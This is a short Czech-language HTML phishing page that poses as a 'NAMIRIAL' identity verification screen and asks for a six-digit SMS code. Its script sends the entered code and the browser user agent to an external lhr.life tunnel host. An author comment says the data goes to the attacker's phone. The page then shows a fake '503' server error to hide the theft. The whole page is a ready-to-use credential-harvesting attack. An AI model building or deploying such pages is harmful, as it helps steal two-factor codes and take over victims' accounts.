<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #111; color: #0f0; font-family: sans-serif; text-align: center; padding: 50px; }
        input { background: #222; border: 1px solid #0f0; color: #0f0; padding: 10px; margin: 10px; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; }
    </style>
</head>
<body>
    <h2>NAMIRIAL - OVĚŘENÍ IDENTITY</h2>
    <p>Zadejte kód z SMS pro dokončení autorizace:</p>
    <input type="text" id="sms_code" placeholder="6-místný kód">
    <br>
    <button onclick="capture()">POTVRDIT</button>

    <script>
        async function capture() {
            const code = document.getElementById('sms_code').value;
            const data = {
                event: "CAPTURED_ATTEMPT",
                code: code,
                userAgent: navigator.userAgent
            };
            // Tohle pošle info k tobě do mobilu
            fetch('https://ebfaa1e1d7eb69.lhr.life', { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
            alert("Chyba serveru: 503. Zkuste to později.");
        }
    </script>
</body>
</html>
